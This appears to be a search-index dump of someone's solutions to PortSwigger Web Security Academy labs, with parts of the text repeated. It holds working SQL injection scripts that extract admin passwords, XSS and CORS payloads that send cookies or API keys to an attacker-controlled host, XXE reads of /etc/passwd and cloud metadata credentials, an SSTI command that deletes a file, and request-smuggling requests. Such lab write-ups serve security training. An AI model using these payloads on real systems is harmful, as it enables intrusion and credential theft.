logic but with table_name in the first select and all_tables as the table: ' UNION SELECT table_name,NULL FROM all_tables-- , then we do: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'-- . Finally we use the attained information to construct a query: ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF-- Eleventh Lab Simply use this script which uses the case when condition and string concatenation to induce conditional errors based on a given character of the password being correct. import string import requests import string payload = \"\" count = 1 while count <= 30: for char in string.ascii_letters + string.digits: r = requests.get(f\"https://0a8d001c0488b738c0eda475002f00cb.web-security-academy.net/\", cookies={\"TrackingId\":f\"FqkZypIERiKR57Km'||(SELECT CASE WHEN(SUBSTR(password,1,{count})='{payload}{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\", \"session\":\"EqyCUGiM2rYeDvhPu8Js9o1I2sB0ZTDK\"}) if r.status_code != 500: continue payload += char print(f\"{payload}\\nStatus Code: {r.status_code}\") count += 1 break Twelth LAB Simply induce a time delay in the tracking cookie: x'||pg_sleep(10) -- - Thirthinth LAB Retrieve information with this script but remember to switch the url for your lab id. import requests import string def main(): index = 1 password = \"\" while index <= 30: for char in string.ascii_letters + string.digits: r = requests.get(\"https://0a5a004b0438160bc046d73800e60088.web-security-academy.net/\", cookies={\"TrackingId\":f\"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{index})='{password}{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\"}) if r.elapsed.total_seconds() < 10: continue password += char index += 1 print(password) break main() XSS Occurs when user unvalidated user input is reflected onto the html. An attacker can then inject arbitrary tags, some of which leads to js execution, thus arises cross site scripting. XSS is split into three categories: Reflected XSS - it's not stored, the reflection occurs only in the subsequent response to the request. Stored XSS - It's stored somewhere, so the reflection is present even if we close the page and re-open it. DOM XSS - Takes place when user input is placed on a sink that allows execution of js. MAIN SINKS document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent MAIN jQuery Sinks add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML() Reflected XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> Reflected XSS LAB 2 Angle brackets are html encoded, so we can't escape the tag context, therefore we need to append an event handler attribute. The final payload to be inserted in the search box is: \" autofocus=\"\" onfocus=\"alert() Reflected XSS LAB 3 Our input is inserted directly onto js context, so we can simply close the string with quote, subtract our alert() payload from that and subtract to another opening quote: '-alert()-' Stored XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> Stored XSS LAB 2 Our input is reflected inside an href a tag attribute of the website input, as such, we can simply inject javascript:alert() . DOM XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> DOM XSS LAB 2 We can't inject tags that execute XSS inside <select>, we close it first. Meaning the final payload is: \"> ` DOM XSS LAB 3 We can't inject <script> or <svg> inside document.write, so we inject: <img src=x onerror=alert()> DOM XSS Lab 4 In this case, we have jquery changing the attribute value of an html tag with attr : $(function() { $('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl')); }); As such, we can simply use javascript:alert(document.cookie in returnUrl) to solve this lab. DOM XSS LAB 5 This one utilizes the selector sink with window.location.hash: $(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); }); VULNERABLE SNIPPET : var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); The $() selector sink can inject malicious objects onto the DOM, as such, if we craft a payload like: #<img src=/ onerror=print()> , a print page will pop up. With that in mind, we can deliver this exploit to the victim: <iframe src=\"https://vulnerable-website.com#\" onload=\"this.src+='<img src=1 onerror=alert(1)>'\"> It loads the iframe with that given src and when it loads, appends an xss payload to that src. XSS to steal cookies Use burpcollborator to steal the admin's cookies via an XSS at post comment section. <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script> Authentication Its the action of verifying the identity of a given user. It's making sure they are who they claim to be. Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to do something. Username enumeration occurs when there's a way to distinguish a failed login attempt from a login attempt with a correct username. It can be response length, time of response, or simply a message such as \"There's no username like that in our database.\" Lab 1 In this LAB, the developer decided to write a message when the username is wrong and when the password doesn't match. With that in mind, we can construct a payload list that iterates over usernames until it finds the \"Incorrect password\", and then iterate over the password list until it doesn't say \"Incorrect password\". Basically, an attacker is able to deduce the account credentials by analyzing the responses given to him. username: arcsight password: hunter LAB 2 This 2FA bypass is fairly simple. Merely login as carlos montoya and when promped for the 2fa code, issue a get request to /my-account. Notice you are logged in. LAB 3 Issue a password reset link from the account wiener, go to email client, click the link, set a new password and click update with intercept on. Notice a POST is sent with a username, change it to carlos, send the request and login to that account with the new password. CSRF CSRF Request forgery takes place when there is an action to be made and cookie based session handling. Example (assume cookie based session handling) GET /change-email?email=example@example.com HTTP/2 This can be crafted onto a URL that is sent to the victim, which, when clicked, changes its email. CSRF Lab 1 Simply send the following to the body of the /exploit url inside the lab <form method=\"$method\" action=\"$url\"> <input type=\"hidden\" name=\"$param1name\" value=\"$param1value\"> </form> <script> document.forms[0].submit(); </script> Change $method to to POST. Change $action to the my-account/change-email Change $param1name to email Change $param1value to an email value. Deliver the exploit. Cors CORS is a defense mechanism that prevents websites from attacking each other. It basically says: Any website with this given origin can talk to me, any other can't. It does that by comparing headers, Origin and Access-Control-Allow-Origin. If they match, then the request is sent. You can't use credentials if the origin is a wildcard. For Access-Control-Allow-Credentials to be true, the Access-Contol-Allow-Origin needs to to not be a wildcard, that is, it needs to be a domain or a group of domains. You can't have *.domain.com as Origin. Sometimes developers go the easy way out and code that any request's to their server will be allowed, by simply reflecting the Origin header's value into Access-Control-Allow-Origin. CORS LAB 1 In this case, the origin header is reflected in the server and credentials are allowed. We craft a CORS requests like this: <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script> replacing the $url with our unique id lab. We store, deliver exploit to victim and click see exploit. We notice the api key of the administrator account is in there, and that is the key to solve the lab. CORS LAB 2 Origin header value can be null, and the server can accept that in the following conditions: Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data). Cross-origin images and media data, including that in <img>, <video> and <audio> elements. Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context. Redirects across origins. iframes with a sandbox attribute that doesn't contain the value allow-same-origin. Responses that are network errors. So, in our case, we craft a sandboxed iframe payload. <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText); }; </script>\"></iframe> Replace $url with the unique lab url. Replace $exploit-server-url with the unique exploit server url. XXE XML External Entity allows an attacker to interfere with application's processing of XML data. It can alllow to view files, interact with systems the app is able to access. It might be leveraged for SSRF. XXE LAB 1 It's fairly simple. Whilst checking the stock of a product, the client queries the server with XML. Thus: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck> XXE LAB 2 Same logic, but we replace file:// with http://169.254.169.254/latest/meta-data/iam/security-credentials/admin, thus: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck> SSRF - Server Side Request Forgery It happens when the server makes a request to an arbitrary server, which can even be itself. If the server allows it, we can use, for example, the file:/// directive to whatever file we want the server to fetch, and the server should return that in the response, if its not a blind SSRF. SSRF LAB 1 The server sends a request to another server to fetch the stock data, as such we only need to replace the server payload with ours: http://localhost/admin/delete?username=carlos SSRF LAB 2 We know there's another internal server which is capable of running admin functions, so we brute-force the last octet of the given IP, appending the url path to do the admin action: http%3A%2F%2F192.168.0.x%3A8080/admin/delete?username=carlos Directory Traversal It occurs when a file is programatically opened with the filename being user input. For example, in python, open(userinput) can lead to this. An attacker, if the input isn't properly validated, can simply append a payload that traverses through the path, such as: ../../../etc/passwd . This allows an attacker to see the etc/passwd file, because .. in Linux means to go back one directory. Directory Traversal LAB 1 A filename parameter is used to fetch images, we replace the image name with: ../../../etc/passwd and the password file is show. Access Control Authorization is the process of determining if a given user can perform the requested actions or access resources. It can be vertical, horizontal or context dependant. Vertical access control mechanisms restrict access to sensitive functionality that is not available to other types of users. For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions Horizontal access control mechanisms restrict access to resources to users who are specifically allowed to access those resources. For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user Context dependant access control mechanisms restrict access to resources based on a user's interaction with them. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment Access Control LAB 1 We need to delete a user knowing there is unprotected admin functionality. We go to robots.txt looking for that and find the endpoint: administrative-panel . We go to it and see we can access all admin functions, such as delete user. We delete the user required to complete the lab Access Control LAB 2 Same logic, but this time exists an admin panel with an unpredictable url generated by js. We open the source code and see the url lying there. Open that url and delete the user required to complete the lab. Access Control LAB 3 This time a user role is set by the cookie Admin=true|false after logging in. So we log in. We need to get admin, so we set the cookie Admin=false to true after logging in. Access Control LAB 4 We know there's a parameter called roleid which when changed to 2 gives us admin. We open burpsuite, enter the lab and notice we can change our roleid in the profile. We set a valid email. Start intercept, click update email and change the request to include \"roleid\":2. We forward it and notice we are admin by clicking on the Admin-Panel link that appeared. Access Control LAB 5 This time, when we log in, we can see the id GET parameter in the url pointing to the current user. Thus, we need only change it to carlos and we are now in carlos's account. Copy his api key and submit it as the solution. Access Control LAB 5 This time, the user-id is unpredictable, nonetheless, we can see it visiting the given user's page. As such, we visit carlos's page and copy the uuid in the get parameter. We login to our account and replace the uuid with carlo's. Copy and paste the api key in the solution. Access Control LAB 6 The response is a redirect but the backend doesn't remove the body, so we can see the results of our request anyway. We log in, go to my account, send that request to burpsuite repeater, add an ?id=carlos query-string to the url and get the api key. Paste it as the solution. Access Control LAB 7 We can change the user id to administrator in my account page after logging in. Send that request to burpsuite, look for the administrator password in the source code. Log in as administrator, dele the user carlos. Access Control LAB 8 We go login to our account, wiener:peter and go to live chat. We send a message and click get transcript. We notice it's getting an endpoint that fetches 2.txt. We change it to 1 and see the password there. Insecure deserialization Serialization is the process of converting data structures such as objects into something that can be sent and received like a stream of bytes. Basically you use it to save the object's state. Deserialization is the process of restoring this stream of bytes to its original state. Insecure deserialization occurs when user input is deserialized. Insecure deserialization LAB 1 We login with account wiener:peter . We open our browser's dev tools. We notice we receive a cookie whose value we decode and notice it is a php serialized object. The admin attribute contains a boolean value set to false. We set it to true by replacing 0 with 1. Encode the cookie. We now have access to the admin panel. Go there and delete user carlos . Information Disclosure. It's the process of discovering sensitive (or not) information that the website unintentionally discloses to the user. Information Disclosure LAB 1 We click to see any arbitrary product and notice it has an id parameter which expects an int. We providade it an arbitrary string such as: \"hello\" and notice it spews out information. The apache version is the challenge. Information Disclosure LAB 2 We open the source-code of the home page and scroll through the comments. We notice one called debug . It points to /cgi-bin/phpinfo.php . We go there and find SECRET_KEY . It is the solution for the lab. Information Disclosure LAB 3 We browse to a directory called /backup/ and it has directory listing set. We click on the only file there. On the source-code, there's a password for a postgres database. It is the solution. Information Disclosure LAB 4 We browse to /admin and notice we need a local IP to view the panel. We TRACE admin and see the header: X-Custom-IP-Authorization . We set it in our request to /admin with value: 127.0.0.1 We send a request to the page and open it in our browser and delete user carlos . Business Logic Vulnerabilities Arise when developers assume an end user will interact a certain way but interacts in another, unintended way, leading to unintended behaviour by the web application (so called logic-flaws). Business logic vulnerabilities LAB 1 This time, the developer assumed a user would only use the browser to make requests, he placed excessive trust in client side controls. This mean we can simply craft a request which changes the price parameter to 1, and we will buy that item for that price. Simply open burpsuite, set intercept on. View details on the 1337 l34th3r j4ck3t, click order, change price to 1, go to your cart and order it. The lab is solved. Server Side Template Injection Occurs when user input is directly concatenated to the template renderer instead of being passed in as data in the appropriate fields. It leads to server-side RCE. SSTi LAB 1 We need to pop RCE knowing it's ERB template. The objective is to delete morale.txt. That's fairly simple, call system function. Final payload: <%= system('rm morale.txt') %> Web Cache Poisoning Between the client and the server lays a cache, it uses keyed input, that is, parts of the http request, to determine if a cached request will be served. The logic is as follows: If the keyed input in the http request matches the keyed input cached, then a cached request is served. Otherwise, it is forwarded to the server. Web Cache Poisoning LAB 1 We send two GET requests to /?cb=1234 and notice the second one's response displays a header: X-Cache: hit , implying the cache served us a response. In order to be served by the cache, we only need to send a request, and the next request (if it has the same keyed input) is served by the cache. The object is to pop an alert via X-Forwarded-Host. Add that header with an arbitrary host value, such as example.com, and send the request. Copy the path of the absolute url it generates. Go the exploit serve and change the filename to that, in the body write alert(document.cookie) and store the exploit. Go back to the previous GET request but remove the query-string. Substitute the arbitrary X-Forwareded-Host value to your exploit-lab url. Send the request until the hit displays again. If the lab is not solved, re-send the request every few seconds until it is. Web Cache Poisoning LAB 2 We need to pop an alert(1) through the cookie. First we add a cache buster such as: ?cb=1234 and figure out which cookie is being reflected. It's fehost, so we add to it: \"-alert(1)-\" . We remove the cache buster, therefore sending that request to / . When we get a X-Cache: hit header, copy the url and paste it in the browser. The alert is popped, lab is solved. Request Smuggling Is the process of sending a smuggled request inside another request. This arises when there are multiple servers before reaching the ultimate backend server. Imagine a situation where the frontend server uses Content-Length to discern where the body ends, but the backend server uses Transfer-Encoding: The frontend will forward the entire request to the backend, due to the matching content-length, but the backend server will see a chunk size of 0, implying the transfer encoding request is over. However, since the frontend server forwarded the whole request, there are still bytes left unprocessed, which due to the nature of the http protocol, will be seen as the next HTTP request. CL-TE: LAB 1 POST / HTTP/1.1 Host: 0af7005004fa2008c0e7414d00480036.web-security-academy.net Cookie: session=q4YcBH0UA9IiP3stGRgZQhwFCOXFSUBi User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://portswigger.net/ Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Sec-Fetch-User: ?1 Te: trailers Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 12 tRANSFER-ENCODING: chunked 0 G TE-CL: LAB 2 It's the same logic: Frontend forwards the entire request, backend only see's some of it, the rest is left unprocessed and will be seen as the next HTTP request. Front end see's the request until the 0 byte, backend only see's the request until what content-length allows. Solutin: POST / HTTP/1.1 Host: 0a3e00eb042b50ccc0fb12c9008d003b.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 0 TE-TE: Make one of the servers not process the TE header in some way. LAB 2 POST / HTTP/1.1 Host: 0a48004d04017b53c0a8806e00fd0057.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0","title":"PortSwigger labs"},{"location":"portswigger/labs/#portswigger-labs","text":"","title":"PortSwigger labs"},{"location":"portswigger/labs/#sql-injection","text":"It allows an attacker to interfere with database queries and retrieve information he should not be able to access. This can be done in various clauses, such as order by, where, having, like. It's important to visualize the current server-side query context by understanding the web app's functionality. Note: Filtering is usually done server side (WHERE clause)","title":"SQL Injection"},{"location":"portswigger/labs/#first-lab","text":"It's a web shop with various products and it can filter them by categories. The category value is directly inserted onto an SQL query in the WHERE clause. The objective is to see every product. This can be done with this simple payload: ' OR 1=1 --","title":"First LAB"},{"location":"portswigger/labs/#second-lab","text":"It's a web shop but I need to login as administrator. This can be done with a simple WHERE clause payload, as that's where the user input is inserted. The payload is: ' OR 1=1 -- If the result of the query is outputted in the response, then we can subvert that to retrieve other information from other tables with a UNION attack. It allows us to execute one or additional SELECT clauses and append the results to the original set. Example SELECT a, b FROM table1 UNION SELECT c, d FROM table2 BUT The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. So, we need to figure out the number of columns in the original query to append a new query. This can be done with the order by keyword. We can order by the result-set column index., Example ' ORDER BY 1 ' ORDER BY 2 until we reach an error which says column with index 3 is out of range for the given table. We can also specify an arbitrary number of values in the new SELECT clause until we avoid the error. SELECT 1, 2, 3, 4... SELECT NULL, NULL, NULL, NULL....","title":"Second LAB"},{"location":"portswigger/labs/#third-lab","text":"It's a web shop. We have another category parameter and we know its inserted in a where clause, the objective is to figure out the number of columns in the result set. As such, we do: ' ORDER BY 1 . No error. ' ORDER BY 2 . There's no error until 4, which means it has 3 columns. According to the lab description, we must use the NULL technique to solve. So we do: ' SELECT NULL,NULL,NULL Generally speaking, we need to know which columns are being reflected to see the resulting set of the UNION query. We can do that by using a unique character in each value of the SELECT clause and see where that is reflected. 'UNION SELECT 1,NULL,NULL ' UNION SELECT NULL,1,NULL","title":"Third LAB"},{"location":"portswigger/labs/#fourth-lab","text":"We need to combine the techniques portrayed earlier, so we insert in the category field: ' ORDER BY 2 -- . No error. Increasing one more gives us an error, so we have 2 columns in the result set. Next, we see which ones can reflect text. We insert: ' UNION SELECT 'hello', 'hello2' -- . We see both of the fields reflect text, so we can just: UNION SELECT username,password FROM users --","title":"Fourth LAB"},{"location":"portswigger/labs/#fith-lab","text":"Sometimes only one column is reflected, so we must concatenating the strings in order to see the output. In this case, two are reflected but only one reflects text. First, we figure out which one with: UNION SELECT 'random_text', NULL -- and ' UNION SELECT NULL, 'random_text' -- . We see the second column accepts text, so we place our payload there: ' UNION SELE T NULL,username||'~'||password FROM users -- Note: String concatenation is different with each SQL version We can query the database version in different ways depending on what type is being served.","title":"Fith LAB"},{"location":"portswigger/labs/#sixth-lab","text":"We use the techniques from before to figure out the columns in the result set and which one is being reflected. As such, the final payload is: ' UNION SELECT @@version, NULL -- - Note:All SQL versions in the cheatsheet accept -- - as a comment Blind SQL injection happens when there is no input reflected on the HTTP response. To test this, an attacker needs to be ware of the output of the application - does the content-length change with different boolean sql logic? That is, the app returns data depending on the query, just not the data you asked for in the query.","title":"Sixth LAB"},{"location":"portswigger/labs/#seventh-lab","text":"It's a blind SQLi, exploitable with the below script, because it looks for changes in the body, that take place if the query is true or not. 2:20 PM import requests import string def main(): password = \"\" for index in range(1, 21): for char in string.ascii_letters + string.digits: cookies = {\"TrackingId\":f\"pcLJqgVbBsfqEax3' AND (SELECT SUBSTRING(password, 1, {index}) FROM users WHERE username='administrator')='{password}{char}\", \"session\":\"LJy9oeGMExJomNP7psWb31UBvNi3Vt6Q\"} r = requests.get(\"https://0ada000e0444e88dc09a9948005700ad.web-security-academy.net/\", cookies=cookies) if \"welcome\" not in r.text.lower(): continue password += char print(password) index += 1 main()","title":"Seventh LAB"},{"location":"portswigger/labs/#eighth-lab","text":"To solve the lab, we need to display the database version string. We know we can use a UNION attack. First we need to see how many columns there are, we do that with an order by query: ' ORDER BY 1 -- - . When we get an error we know there are current column number - 1 columns. Then we need to see which columns displays strings. We do that with: ' UNION SELECT 'abc','def' -- - . The string reflected implies which column reflects. We know it's the first one, so we switch 'abc' for @@version and 'def' for NULL and the lab is solved.","title":"Eighth Lab"},{"location":"portswigger/labs/#ninth-lab","text":"First we need to find the name of the users table: ' UNION SELECT table_name, NULL FROM information_schema.tables -- - . After, we find the name of the columns in that table: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=<found_table_name> Then we simply fetch username and password with our attained knowledge. ' UNION SELECT <found_username_column_name>, <found_password_column_name FROM <found_table_name> -- - We log in and the lab is solved.","title":"Ninth Lab"},{"location":"portswigger/labs/#tenth-lab","text":"We repeat the same logic but with table_name in the first select and all_tables as the table: ' UNION SELECT table_name,NULL FROM all_tables-- , then we do: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'-- . Finally we use the attained information to construct a query: ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--","title":"Tenth Lab"},{"location":"portswigger/labs/#eleventh-lab","text":"Simply use this script which uses the case when condition and string concatenation to induce conditional errors based on a given character of the password being correct. import string import requests import string payload = \"\" count = 1 while count <= 30: for char in string.ascii_letters + string.digits: r = requests.get(f\"https://0a8d001c0488b738c0eda475002f00cb.web-security-academy.net/\", cookies={\"TrackingId\":f\"FqkZypIERiKR57Km'||(SELECT CASE WHEN(SUBSTR(password,1,{count})='{payload}{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\", \"session\":\"EqyCUGiM2rYeDvhPu8Js9o1I2sB0ZTDK\"}) if r.status_code != 500: continue payload += char print(f\"{payload}\\nStatus Code: {r.status_code}\") count += 1 break","title":"Eleventh Lab"},{"location":"portswigger/labs/#twelth-lab","text":"Simply induce a time delay in the tracking cookie: x'||pg_sleep(10) -- -","title":"Twelth LAB"},{"location":"portswigger/labs/#thirthinth-lab","text":"Retrieve information with this script but remember to switch the url for your lab id. import requests import string def main(): index = 1 password = \"\" while index <= 30: for char in string.ascii_letters + string.digits: r = requests.get(\"https://0a5a004b0438160bc046d73800e60088.web-security-academy.net/\", cookies={\"TrackingId\":f\"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{index})='{password}{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\"}) if r.elapsed.total_seconds() < 10: continue password += char index += 1 print(password) break main()","title":"Thirthinth LAB"},{"location":"portswigger/labs/#xss","text":"Occurs when user unvalidated user input is reflected onto the html. An attacker can then inject arbitrary tags, some of which leads to js execution, thus arises cross site scripting. XSS is split into three categories: Reflected XSS - it's not stored, the reflection occurs only in the subsequent response to the request. Stored XSS - It's stored somewhere, so the reflection is present even if we close the page and re-open it. DOM XSS - Takes place when user input is placed on a sink that allows execution of js. MAIN SINKS document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent MAIN jQuery Sinks add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()","title":"XSS"},{"location":"portswigger/labs/#reflected-xss-lab-1","text":"There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script>","title":"Reflected XSS LAB 1"},{"location":"portswigger/labs/#reflected-xss-lab-2","text":"Angle brackets are html encoded, so we can't escape the tag context, therefore we need to append an event handler attribute. The final payload to be inserted in the search box is: \" autofocus=\"\" onfocus=\"alert()","title":"Reflected XSS LAB 2"},{"location":"portswigger/labs/#reflected-xss-lab-3","text":"Our input is inserted directly onto js context, so we can simply close the string with quote, subtract our alert() payload from that and subtract to another opening quote: '-alert()-'","title":"Reflected XSS LAB 3"},{"location":"portswigger/labs/#stored-xss-lab-1","text":"There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script>","title":"Stored XSS LAB 1"},{"location":"portswigger/labs/#stored-xss-lab-2","text":"Our input is reflected inside an href a tag attribute of the website input, as such, we can simply inject javascript:alert() .","title":"Stored XSS LAB 2"},{"location":"portswigger/labs/#dom-xss-lab-1","text":"There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script>","title":"DOM XSS LAB 1"},{"location":"portswigger/labs/#dom-xss-lab-2","text":"We can't inject tags that execute XSS inside <select>, we close it first. Meaning the final payload is: \"> `","title":"DOM XSS LAB 2"},{"location":"portswigger/labs/#dom-xss-lab-3","text":"We can't inject <script> or <svg> inside document.write, so we inject: <img src=x onerror=alert()>","title":"DOM XSS LAB 3"},{"location":"portswigger/labs/#dom-xss-lab-4","text":"In this case, we have jquery changing the attribute value of an html tag with attr : $(function() { $('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl')); }); As such, we can simply use javascript:alert(document.cookie in returnUrl) to solve this lab.","title":"DOM XSS Lab 4"},{"location":"portswigger/labs/#dom-xss-lab-5","text":"This one utilizes the selector sink with window.location.hash: $(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); }); VULNERABLE SNIPPET : var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); The $() selector sink can inject malicious objects onto the DOM, as such, if we craft a payload like: #<img src=/ onerror=print()> , a print page will pop up. With that in mind, we can deliver this exploit to the victim: <iframe src=\"https://vulnerable-website.com#\" onload=\"this.src+='<img src=1 onerror=alert(1)>'\"> It loads the iframe with that given src and when it loads, appends an xss payload to that src.","title":"DOM XSS LAB 5"},{"location":"portswigger/labs/#xss-to-steal-cookies","text":"Use burpcollborator to steal the admin's cookies via an XSS at post comment section. <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>","title":"XSS to steal cookies"},{"location":"portswigger/labs/#authentication","text":"Its the action of verifying the identity of a given user. It's making sure they are who they claim to be. Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to do something. Username enumeration occurs when there's a way to distinguish a failed login attempt from a login attempt with a correct username. It can be response length, time of response, or simply a message such as \"There's no username like that in our database.\"","title":"Authentication"},{"location":"portswigger/labs/#lab-1","text":"In this LAB, the developer decided to write a message when the username is wrong and when the password doesn't match. With that in mind, we can construct a payload list that iterates over usernames until it finds the \"Incorrect password\", and then iterate over the password list until it doesn't say \"Incorrect password\". Basically, an attacker is able to deduce the account credentials by analyzing the responses given to him. username: arcsight password: hunter","title":"Lab 1"},{"location":"portswigger/labs/#lab-2","text":"This 2FA bypass is fairly simple. Merely login as carlos montoya and when promped for the 2fa code, issue a get request to /my-account. Notice you are logged in.","title":"LAB 2"},{"location":"portswigger/labs/#lab-3","text":"Issue a password reset link from the account wiener, go to email client, click the link, set a new password and click update with intercept on. Notice a POST is sent with a username, change it to carlos, send the request and login to that account with the new password.","title":"LAB 3"},{"location":"portswigger/labs/#csrf","text":"CSRF Request forgery takes place when there is an action to be made and cookie based session handling. Example (assume cookie based session handling) GET /change-email?email=example@example.com HTTP/2 This can be crafted onto a URL that is sent to the victim, which, when clicked, changes its email.","title":"CSRF"},{"location":"portswigger/labs/#csrf-lab-1","text":"Simply send the following to the body of the /exploit url inside the lab <form method=\"$method\" action=\"$url\"> <input type=\"hidden\" name=\"$param1name\" value=\"$param1value\"> </form> <script> document.forms[0].submit(); </script> Change $method to to POST. Change $action to the my-account/change-email Change $param1name to email Change $param1value to an email value. Deliver the exploit.","title":"CSRF Lab 1"},{"location":"portswigger/labs/#cors","text":"CORS is a defense mechanism that prevents websites from attacking each other. It basically says: Any website with this given origin can talk to me, any other can't. It does that by comparing headers, Origin and Access-Control-Allow-Origin. If they match, then the request is sent. You can't use credentials if the origin is a wildcard. For Access-Control-Allow-Credentials to be true, the Access-Contol-Allow-Origin needs to to not be a wildcard, that is, it needs to be a domain or a group of domains. You can't have *.domain.com as Origin. Sometimes developers go the easy way out and code that any request's to their server will be allowed, by simply reflecting the Origin header's value into Access-Control-Allow-Origin.","title":"Cors"},{"location":"portswigger/labs/#cors-lab-1","text":"In this case, the origin header is reflected in the server and credentials are allowed. We craft a CORS requests like this: <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script> replacing the $url with our unique id lab. We store, deliver exploit to victim and click see exploit. We notice the api key of the administrator account is in there, and that is the key to solve the lab.","title":"CORS LAB 1"},{"location":"portswigger/labs/#cors-lab-2","text":"Origin header value can be null, and the server can accept that in the following conditions: Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data). Cross-origin images and media data, including that in <img>, <video> and <audio> elements. Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context. Redirects across origins. iframes with a sandbox attribute that doesn't contain the value allow-same-origin. Responses that are network errors. So, in our case, we craft a sandboxed iframe payload. <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText); }; </script>\"></iframe> Replace $url with the unique lab url. Replace $exploit-server-url with the unique exploit server url.","title":"CORS LAB 2"},{"location":"portswigger/labs/#xxe","text":"XML External Entity allows an attacker to interfere with application's processing of XML data. It can alllow to view files, interact with systems the app is able to access. It might be leveraged for SSRF.","title":"XXE"},{"location":"portswigger/labs/#xxe-lab-1","text":"It's fairly simple. Whilst checking the stock of a product, the client queries the server with XML. Thus: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>","title":"XXE LAB 1"},{"location":"portswigger/labs/#xxe-lab-2","text":"Same logic, but we replace 